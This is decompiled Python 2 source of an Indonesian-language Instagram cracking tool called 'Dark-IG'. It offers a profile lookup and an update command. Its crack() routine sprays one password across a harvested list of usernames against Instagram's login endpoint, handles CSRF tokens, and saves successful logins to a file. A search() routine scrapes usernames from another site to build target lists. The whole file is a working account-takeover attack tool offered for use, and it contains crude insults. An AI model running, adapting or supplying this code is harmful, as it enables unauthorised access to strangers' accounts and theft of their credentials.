# uncompyle6 version 3.4.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.7.4 (default, Aug  6 2019, 00:06:31) 
# [Clang 8.0.7 (https://android.googlesource.com/toolchain/clang b55f2d4ebfd35bf6
# Embedded file name: <script>
# Compiled at: 2018-02-25 13:25:47
import os, sys, time, urllib
from urllib import urlopen as buka
from bs4 import BeautifulSoup as soup
import json
try:
    import requests
except ImportError:
    os.system('reset')
    rqs = raw_input('\x1b[1;91m[+] \x1b[1;92mPerlu install requests \x1b[1;97m(y/t): ')
    if rqs == '':
        print '\x1b[1;91m[!] Jangan kosong'
        os.sys.exit()
    elif rqs == 'y':
        os.system('pip2 install requests')
        exit()
    elif rqs == 'Y':
        os.system('pip2 install requests')
        exit()
    elif rqs == 't':
        os.sys.exit()
    elif rqs == 'T':
        os.sys.exit()
    else:
        print '\x1b[1;91m[!]\x1b[1;92m Pilih\x1b[1;93m (y/n)'
        time.sleep(1)
        os.sys.exit()

base = 'https://www.instagram.com/'
url = base + 'accounts/login/ajax/'
session = requests.Session()
session.headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36'}
session.headers.update({'Referer': base})
from requests.exceptions import ConnectionError

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def keluar():
    print '\x1b[1;91m[!] Keluar'
    os.sys.exit()


logo = "\x1b[1;97m\n ___    ___\n( _<    >_ )\n//        \\\\\n\\\\___\x1b[1;91m..\x1b[1;97m___//               \x1b[1;92m[\x1b[1;97mDark-IG\x1b[1;92m]\x1b[1;93mv0.1\x1b[1;97m\n `-(    )-'\n   _|__|_   \x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mZeDD\x1b[1;97m\n  /_|__|_\\  \x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mLimite\x1b[1;97m[\x1b[1;96mD\x1b[1;97m] \x1b[1;97m/ \x1b[1;96m./R41N53 \x1b[1;97m/ \x1b[1;96mAl2VyN\x1b[1;97m\n  /_|__|_\\  \x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/rezadkim\x1b[0m\x1b[1;97m\n  /_\\__/_\\  =========================================\n   \\ || /  _)\n     ||   ( )\n     \\\\___//\n      `---' "
back = 0
berhasil = []
gagal = []
name = []
has = []

def menu():
    os.system('reset')
    print logo
    print 30 * '\x1b[1;97m='
    print '\x1b[1;91m1.\x1b[1;97m Lihat informasi Username'
    print '\x1b[1;91m2.\x1b[1;97m Crack'
    print '\x1b[1;91m3.\x1b[1;97m Ambil Username'
    print '\x1b[1;91m4.\x1b[1;97m Update'
    print '\x1b[1;91m0. Keluar'
    print 30 * '\x1b[1;97m-'
    chose()


def chose():
    pilih = raw_input('\x1b[1;91mPilih\x1b[1;97m : ')
    if pilih == '':
        print '\x1b[1;91m[!] Jangan kosong'
        chose()
    elif pilih == '1':
        informasi()
    elif pilih == '2':
        crack()
        hasil()
    elif pilih == '3':
        search()
    elif pilih == '4':
        jalan('\x1b[1;91m[!] \x1b[1;92mMemeriksa update \x1b[1;97m...')
        r = requests.get('https://raw.githubusercontent.com/rezadkim/dark-ig/master/README.md').text
        if 'v0.2' in str(r) or 'v0.3' in str(r) or 'v0.4' in str(r) or 'v0.5' in str(r) or 'v0.6' in str(r) or 'v0.7' in str(r) or 'v0.8' in str(r) or 'v0.9' in str(r) or 'v1.1' in str(r):
            os.system('git pull')
            os.system('python2 ig.py')
        else:
            print '\x1b[1;91m[!] Belum ada versi terbaru'
            keluar()
    elif pilih == '0':
        keluar()
    else:
        print '\x1b[1;91m[!] \x1b[1;97m' + pilih + ' \x1b[1;91mTidak ada'
        chose()


def informasi():
    os.system('reset')
    print logo
    print 30 * '\x1b[1;97m='
    try:
        usr = raw_input('\x1b[1;91m[+] \x1b[1;32mUsername \x1b[1;91m:\x1b[1;97m ')
        jalan('\x1b[1;91m[+] \x1b[1;92mTunggu sebentar\x1b[1;97m ...')
        print 30 * '\x1b[1;97m='
        url = 'https://www.instagram.com/' + usr
        r = requests.get(url)
        sayur = soup(r.content, 'html.parser')
        data = sayur.find_all('meta', attrs={'property': 'og:description'})
        text = data[0].get('content').split()
        pengikut = text[0]
        ikuti = text[2]
        postingan = text[4]
        info = {}
        info['Followers'] = pengikut
        info['Following'] = ikuti
        info['Posts'] = postingan
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[!] Tidak ada koneksi'
        keluar()
    except (KeyError, IndexError):
        print '\x1b[1;91m[!] User tidak ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()

    print '\x1b[1;91m[?] \x1b[1;92mPengguna  \x1b[1;97m: @' + usr
    print '\x1b[1;91m[?] \x1b[1;92mPengikut  \x1b[1;97m: ' + pengikut
    print '\x1b[1;91m[?] \x1b[1;92mDi ikuti  \x1b[1;97m: ' + ikuti
    print '\x1b[1;91m[?] \x1b[1;92mPostingan \x1b[1;97m: ' + postingan
    print '\x1b[1;91m[?] \x1b[1;92mPassword  \x1b[1;97m: Gatau goblok'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu()


def crack():
    global back
    global berhasil
    global gagal
    global up
    os.system('reset')
    print logo
    print 30 * '\x1b[1;97m='
    idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile User \x1b[1;91m: \x1b[1;97m')
    passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword  \x1b[1;91m: \x1b[1;97m')
    try:
        file = open(idlist, 'r')
        jalan('\x1b[1;91m[!] \x1b[1;92mPastikan koneksi internet anda super greget\x1b[1;97m ...')
        print 30 * '\x1b[1;97m='
    except IOError:
        print '\x1b[1;91m[!] File tidak ditemukan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()
    else:
        try:
            buka = open(idlist, 'r')
            up = buka.read().split()
            while file:
                username = file.readline().strip()
                req = session.get(base)
                session.headers.update({'X-CSRFToken': req.cookies['csrftoken']})
                login_data = {'username': username, 'password': passw}
                login = session.post(url, data=login_data, allow_redirects=True)
                session.headers.update({'X-CSRFToken': login.cookies['csrftoken']})
                cookies = login.cookies
                memek = json.loads(login.text)
                if back == len(up):
                    break
                elif 'userId' in memek:
                    bisa = open('Berhasil.txt', 'w')
                    bisa.write(username + ' | ' + passw + '\n')
                    bisa.close()
                    berhasil.append('    \x1b[32mUsername \x1b[1;97m: ' + username + ' | \x1b[1;92mPassword \x1b[1;97m: ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
                sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m%\x1b[1;91m] \x1b[1;92mCrack     \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive \x1b[1;91m:\x1b[1;96m ' + str(len(berhasil)))
                sys.stdout.flush()

        except IOError:
            print '\n\x1b[1;91m[!] Koneksi terganggu'
            time.sleep(1)
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Tidak ada koneksi'
            keluar()


def hasil():
    print
    print 30 * '\x1b[1;97m='
    print '\x1b[32m[\x1b[31m+\x1b[32m] \x1b[1;92mBerhasil \x1b[1;97m--> ' + str(len(berhasil))
    for b in berhasil:
        print b

    print '\x1b[31m[+] Gagal    \x1b[1;97m--> ' + str(len(gagal))
    print
    keluar()


def search():
    os.system('reset')
    print logo
    print 30 * '\x1b[1;97m='
    try:
        cari = raw_input('\x1b[1;91m[+] \x1b[1;92mCari user \x1b[1;91m: \x1b[1;97m')
        simpan = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan file \x1b[1;97m(user.txt) \x1b[1;91m: \x1b[1;97m')
        sim = open(simpan, 'w')
        key = cari
        jalan('\x1b[1;91m[+] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
        print 30 * '\x1b[1;97m='
        url = 'https://web.stagram.com/search/?query=' + key
        selesai = buka(url)
        page_html = selesai.read()
        selesai.close()
        page_soup = soup(page_html, 'html.parser')
        contolatos = page_soup.findAll('div', {'class': 'card-block text-center'})
        for mek in contolatos:
            username = mek.findAll('h4', {'class': 'card-title text-truncate'})
            user = username[0].text
            if '#' in user:
                print '\x1b[1;91m[+] \x1b[1;92mHastag\x1b[1;91m :\x1b[1;93m ' + user
                tag = user
                has.append(tag)
            else:
                print '\x1b[1;91m[+] \x1b[1;92mUser\x1b[1;91m   :\x1b[1;97m @' + user
                id = user
                sim.write(id + '\n')
                name.append(id)

    except IOError:
        print '\x1b[1;91m[!] Error'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu()

    print '\n\r\x1b[1;91m[?] \x1b[1;97mJumlah    \x1b[1;91m: \x1b[1;97musr/\x1b[1;96m' + str(len(name)) + ' \x1b[1;97mtag/\x1b[1;96m' + str(len(has))
    print '\x1b[1;91m[+] \x1b[1;97mTersimpan \x1b[1;91m:\x1b[1;97m ' + simpan
    sim.close()
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu()


if __name__ == '__main__':
    menu()
# okay decompiling 4.pyc
